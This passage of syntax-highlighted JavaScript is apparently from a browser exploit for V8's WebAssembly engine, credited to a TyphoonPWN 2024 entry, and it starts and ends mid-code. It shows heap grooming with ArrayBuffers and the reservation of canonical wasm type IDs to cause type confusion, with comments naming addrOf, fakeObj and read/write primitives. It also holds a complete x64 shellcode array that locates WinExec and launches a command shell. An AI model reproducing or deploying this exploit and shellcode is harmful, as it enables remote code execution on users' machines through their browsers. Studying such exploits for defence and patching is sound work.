class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">0x4000</span> <span class="token operator">/</span> <span class="token number">0x40</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          abs<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ArrayBuffer</span><span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">new</span> <span class="token class-name">DataView</span><span class="token punctuation">(</span>abs<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setBigUint64</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x1337c0de1337da7an</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> ab <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayBuffer</span><span class="token punctuation">(</span><span class="token number">0x20000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">new</span> <span class="token class-name">DataView</span><span class="token punctuation">(</span>ab<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setBigUint64</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0xdeadbeefcafebaben</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">/*for (let i = 0; i &lt; 0x180000 / 0x20000; i++) &#123;        nogc.push(new ArrayBuffer(0x20000));    &#125;*/</span>        <span class="token comment">// WinExec(sc+sc.len, 1)</span>        <span class="token keyword">const</span> sc <span class="token operator">=</span> <span class="token punctuation">[</span>          <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x83</span><span class="token punctuation">,</span> <span class="token number">0xec</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x83</span><span class="token punctuation">,</span> <span class="token number">0xe4</span><span class="token punctuation">,</span> <span class="token number">0xf0</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x83</span><span class="token punctuation">,</span> <span class="token number">0xec</span><span class="token punctuation">,</span>          <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0xe8</span><span class="token punctuation">,</span> <span class="token number">0x44</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x89</span><span class="token punctuation">,</span> <span class="token number">0x44</span><span class="token punctuation">,</span> <span class="token number">0x24</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span>          <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x8d</span><span class="token punctuation">,</span> <span class="token number">0x15</span><span class="token punctuation">,</span> <span class="token number">0xed</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x8b</span><span class="token punctuation">,</span> <span class="token number">0x4c</span><span class="token punctuation">,</span> <span class="token number">0x24</span><span class="token punctuation">,</span>          <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0xe8</span><span class="token punctuation">,</span> <span class="token number">0x4a</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0xba</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>          <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x8d</span><span class="token punctuation">,</span> <span class="token number">0x0d</span><span class="token punctuation">,</span> <span class="token number">0xe5</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0xff</span><span class="token punctuation">,</span> <span class="token number">0xd0</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x8d</span><span class="token punctuation">,</span>          <span class="token number">0x15</span><span class="token punctuation">,</span> <span class="token number">0xd6</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x8b</span><span class="token punctuation">,</span> <span class="token number">0x4c</span><span class="token punctuation">,</span> <span class="token number">0x24</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0xe8</span><span class="token punctuation">,</span>          <span class="token number">0x2b</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x89</span><span class="token punctuation">,</span> <span class="token number">0xc3</span><span class="token punctuation">,</span> <span class="token number">0xb9</span><span class="token punctuation">,</span> <span class="token number">0xff</span><span class="token punctuation">,</span> <span class="token number">0xff</span><span class="token punctuation">,</span> <span class="token number">0xff</span><span class="token punctuation">,</span>          <span class="token number">0xff</span><span class="token punctuation">,</span> <span class="token number">0xff</span><span class="token punctuation">,</span> <span class="token number">0xd0</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x89</span><span class="token punctuation">,</span> <span class="token number">0xd8</span><span class="token punctuation">,</span> <span class="token number">0xeb</span><span class="token punctuation">,</span> <span class="token number">0xf4</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x8b</span><span class="token punctuation">,</span>          <span class="token number">0x04</span><span class="token punctuation">,</span> <span class="token number">0x25</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x8b</span><span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span>          <span class="token number">0x8b</span><span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x8b</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x8b</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x8b</span><span class="token punctuation">,</span>          <span class="token number">0x40</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0xc3</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0x57</span><span class="token punctuation">,</span> <span class="token number">0x56</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x89</span><span class="token punctuation">,</span> <span class="token number">0x4c</span><span class="token punctuation">,</span>          <span class="token number">0x24</span><span class="token punctuation">,</span> <span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x89</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x24</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x8b</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0x3c</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span>          <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0xcb</span><span class="token punctuation">,</span> <span class="token number">0x8b</span><span class="token punctuation">,</span> <span class="token number">0x9b</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0xcb</span><span class="token punctuation">,</span>          <span class="token number">0x44</span><span class="token punctuation">,</span> <span class="token number">0x8b</span><span class="token punctuation">,</span> <span class="token number">0x43</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token number">0x8b</span><span class="token punctuation">,</span> <span class="token number">0x7b</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0xcf</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span>          <span class="token number">0x31</span><span class="token punctuation">,</span> <span class="token number">0xf6</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x31</span><span class="token punctuation">,</span> <span class="token number">0xc0</span><span class="token punctuation">,</span> <span class="token number">0x4c</span><span class="token punctuation">,</span> <span class="token number">0x39</span><span class="token punctuation">,</span> <span class="token number">0xc6</span><span class="token punctuation">,</span> <span class="token number">0x73</span><span class="token punctuation">,</span> <span class="token number">0x43</span><span class="token punctuation">,</span> <span class="token number">0x8b</span><span class="token punctuation">,</span>          <span class="token number">0x0c</span><span class="token punctuation">,</span> <span class="token number">0xb7</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x03</span><span class="token punctuation">,</span> <span class="token number">0x4c</span><span class="token punctuation">,</span> <span class="token number">0x24</span><span class="token punctuation">,</span> <span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x8b</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x24</span><span class="token punctuation">,</span>          <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x83</span><span class="token punctuation">,</span> <span class="token number">0xec</span><span class="token punctuation">,</span> <span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token number">0xe8</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span>          <span class="token number">0x83</span><span class="token punctuation">,</span> <span class="token number">0xc4</span><span class="token punctuation">,</span> <span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x85</span><span class="token punctuation">,</span> <span class="token number">0xc0</span><span class="token punctuation">,</span> <span class="token number">0x74</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x31</span><span class="token punctuation">,</span> <span class="token number">0xc0</span><span class="token punctuation">,</span>          <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0xff</span><span class="token punctuation">,</span> <span class="token number">0xc6</span><span class="token punctuation">,</span> <span class="token number">0xeb</span><span class="token punctuation">,</span> <span class="token number">0xd4</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x8b</span><span class="token punctuation">,</span> <span class="token number">0x4c</span><span class="token punctuation">,</span> <span class="token number">0x24</span><span class="token punctuation">,</span> <span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token number">0x8b</span><span class="token punctuation">,</span>          <span class="token number">0x7b</span><span class="token punctuation">,</span> <span class="token number">0x24</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0xcf</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x0f</span><span class="token punctuation">,</span> <span class="token number">0xb7</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">,</span> <span class="token number">0x77</span><span class="token punctuation">,</span> <span class="token number">0x8b</span><span class="token punctuation">,</span>          <span class="token number">0x7b</span><span class="token punctuation">,</span> <span class="token number">0x1c</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0xcf</span><span class="token punctuation">,</span> <span class="token number">0x8b</span><span class="token punctuation">,</span> <span class="token number">0x04</span><span class="token punctuation">,</span> <span class="token number">0xb7</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0xc8</span><span class="token punctuation">,</span>          <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x58</span><span class="token punctuation">,</span> <span class="token number">0x5e</span><span class="token punctuation">,</span> <span class="token number">0x5f</span><span class="token punctuation">,</span> <span class="token number">0x5b</span><span class="token punctuation">,</span> <span class="token number">0xc3</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0x8a</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0x8a</span><span class="token punctuation">,</span> <span class="token number">0x1a</span><span class="token punctuation">,</span>          <span class="token number">0x84</span><span class="token punctuation">,</span> <span class="token number">0xc0</span><span class="token punctuation">,</span> <span class="token number">0x74</span><span class="token punctuation">,</span> <span class="token number">0x0c</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">0xd8</span><span class="token punctuation">,</span> <span class="token number">0x75</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0xff</span><span class="token punctuation">,</span> <span class="token number">0xc1</span><span class="token punctuation">,</span>          <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0xff</span><span class="token punctuation">,</span> <span class="token number">0xc2</span><span class="token punctuation">,</span> <span class="token number">0xeb</span><span class="token punctuation">,</span> <span class="token number">0xec</span><span class="token punctuation">,</span> <span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token number">0xd8</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x0f</span><span class="token punctuation">,</span> <span class="token number">0xbe</span><span class="token punctuation">,</span> <span class="token number">0xc0</span><span class="token punctuation">,</span>          <span class="token number">0x5b</span><span class="token punctuation">,</span> <span class="token number">0xc3</span><span class="token punctuation">,</span> <span class="token number">0x57</span><span class="token punctuation">,</span> <span class="token number">0x69</span><span class="token punctuation">,</span> <span class="token number">0x6e</span><span class="token punctuation">,</span> <span class="token number">0x45</span><span class="token punctuation">,</span> <span class="token number">0x78</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0x63</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span>          <span class="token number">0x6c</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>        <span class="token punctuation">]</span><span class="token punctuation">;</span>        cmd <span class="token operator">=</span>          <span class="token string">'cmd /c "title Pwned! &amp; echo \x1b[4;97mPwned by Seunghyun Lee (Xion, @0x10n), for TyphoonPWN 2024\x1b[0m &amp; echo \x1b[5;96m &amp; echo    /$$$$$$$  /$$      /$$ /$$   /$$ /$$$$$$$$ /$$$$$$$  /$$ &amp; echo   ^| $$__  $$^| $$  /$ ^| $$^| $$$ ^| $$^| $$_____/^| $$__  $$^| $$ &amp; echo   ^| $$  \\ $$^| $$ /$$$^| $$^| $$$$^| $$^| $$      ^| $$  \\ $$^| $$ &amp; echo   ^| $$$$$$$/^| $$/$$ $$ $$^| $$ $$ $$^| $$$$$   ^| $$  ^| $$^| $$ &amp; echo   ^| $$____/ ^| $$$$_  $$$$^| $$  $$$$^| $$__/   ^| $$  ^| $$^|__/ &amp; echo   ^| $$      ^| $$$/ \\  $$$^| $$\\  $$$^| $$      ^| $$  ^| $$     &amp; echo   ^| $$      ^| $$/   \\  $$^| $$ \\  $$^| $$$$$$$$^| $$$$$$$/ /$$ &amp; echo   ^|__/      ^|__/     \\__/^|__/  \\__/^|________/^|_______/ ^|__/ &amp; echo \x1b[0m &amp; cmd"'</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> cmd<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          sc<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>cmd<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        sc<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token number">0x00</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// prevent isorecursive group canonicalization merge</span>        <span class="token keyword">function</span> <span class="token function">encodeTag</span><span class="token punctuation">(</span><span class="token parameter">val<span class="token punctuation">,</span> bitlen <span class="token operator">=</span> <span class="token number">33</span></span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">return</span> val            <span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">padStart</span><span class="token punctuation">(</span>bitlen<span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">reverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">v</span><span class="token punctuation">)</span> <span class="token operator">=></span>              v <span class="token operator">===</span> <span class="token string">"0"</span> <span class="token operator">?</span> <span class="token function">makeField</span><span class="token punctuation">(</span>kWasmI32<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token function">makeField</span><span class="token punctuation">(</span>kWasmI64<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">let</span> reserveCtr <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function">reserve</span><span class="token punctuation">(</span><span class="token parameter">cnt</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">const</span> builder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WasmModuleBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          builder<span class="token punctuation">.</span><span class="token function">startRecGroup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          builder<span class="token punctuation">.</span><span class="token function">addStruct</span><span class="token punctuation">(</span><span class="token function">encodeTag</span><span class="token punctuation">(</span><span class="token operator">++</span>reserveCtr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> cnt <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            builder<span class="token punctuation">.</span><span class="token function">addArray</span><span class="token punctuation">(</span>kWasmI64<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">//builder.addType(kSig_v_v);</span>            <span class="token comment">//builder.addStruct([makeField(kWasmI64, true)]);</span>          <span class="token punctuation">&#125;</span>          builder<span class="token punctuation">.</span><span class="token function">addStruct</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> cnt <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// self-ref -> err, halt wasm comp</span>          builder<span class="token punctuation">.</span><span class="token function">endRecGroup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">const</span> buf <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">toBuffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">const</span> _ <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebAssembly<span class="token punctuation">.</span>Module</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"no crash?????"</span><span class="token punctuation">,</span> reserveCtr<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">"forward-declared supertype"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>              console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>                <span class="token string">"[*] Reserved "</span> <span class="token operator">+</span> cnt <span class="token operator">+</span> <span class="token string">" isorecursive canonical type ids"</span>              <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>              console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"caught wrong exc???"</span><span class="token punctuation">,</span> e<span class="token punctuation">,</span> reserveCtr<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">/*        kFunc = kV8MaxWasmTypes,  // shorthand: c / 1000000        kEq,                      // shorthand: q / 1000001        kI31,                     // shorthand: j / 1000002        kStruct,                  // shorthand: o / 1000003        kArray,                   // shorthand: g / 1000004        kAny,                     //              / 1000005 &lt;- any (which is actually a struct) -> type        kExtern,                  // shorthand: a./ 1000006    */</span>        <span class="token comment">// R: int -> int* + read</span>        <span class="token comment">// W: int -> int* + write</span>        <span class="token comment">// addrOf: externref -> int</span>        <span class="token comment">// fakeObj: int -> externref</span>        <span class="token comment">// kNumberOfPredefinedTypes = 2</span>        <span class="token function">reserve</span><span class="token punctuation">(</span><span class="token number">1000000</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">reserve</span><span class="token punctuation">(</span><span class="token number">0x100000</span> <span class="token operator">-</span> <span class="token number">1000000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// this two lines can be repeated (filling 20bits)</span>        <span class="token comment">//reserve(1000000);</span>        <span class="token comment">//reserve(0x100000 - 1000000);</span>        <span class="token comment">// 1. create any -> int casting functions</span>        <span class="token function">reserve</span><span class="token punctuation">(</span><span class="token number">1000000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">reserve</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#123;</span>          <span class="token keyword">let</span> builder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WasmModuleBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          builder<span class="token punctuation">.</span><span class="token function">startRecGroup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">let</span> struct <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">addStruct</span><span class="token punctuation">(</span><span class="token punctuation">[</span>            <span class="token function">makeField</span><span class="token punctuation">(</span>kWasmI32<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token function">makeField</span><span class="token punctuation">(</span>kWasmI32<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">,</span>          <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1000005 (kAny)</span>          <span class="token keyword">let</span> funcSig <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">addType</span><span class="token punctuation">(</span>            <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token function">wasmRefType</span><span class="token punctuation">(</span>struct<span class="token punctuation">)</span><span class="token punctuation">,</span> kWasmI32<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>kWasmI32<span class="token punctuation">]</span><span class="token punctuation">)</span>          <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1000006</span>          <span class="token keyword">let</span> funcSig2 <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">addType</span><span class="token punctuation">(</span><span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token function">wasmRefType</span><span class="token punctuation">(</span>struct<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1000007</span>          builder<span class="token punctuation">.</span><span class="token function">addStruct</span><span class="token punctuation">(</span><span class="token function">encodeTag</span><span class="token punctuation">(</span><span class="token number">0x133370000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1000008</span>          builder<span class="token punctuation">.</span><span class="token function">endRecGroup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          builder            <span class="token punctuation">.</span><span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">"i_init"</span><span class="token punctuation">,</span> funcSig2<span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">addBody</span><span class="token punctuation">(</span><span class="token punctuation">[</span>              kExprI32Const<span class="token punctuation">,</span>              <span class="token number">0</span><span class="token punctuation">,</span>              kExprI32Const<span class="token punctuation">,</span>              <span class="token number">0</span><span class="token punctuation">,</span>              kGCPrefix<span class="token punctuation">,</span>              kExprStructNew<span class="token punctuation">,</span>              struct<span class="token punctuation">,</span>            <span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">exportFunc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          builder            <span class="token punctuation">.</span><span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">"i_get0"</span><span class="token punctuation">,</span> funcSig<span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">addBody</span><span class="token punctuation">(</span><span class="token punctuation">[</span>              kExprLocalGet<span class="token punctuation">,</span>              <span class="token number">0</span><span class="token punctuation">,</span>              kGCPrefix<span class="token punctuation">,</span>              kExprStructGet<span class="token punctuation">,</span>              struct<span class="token punctuation">,</span>              <span class="token operator">...</span><span class="token function">wasmUnsignedLeb</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span 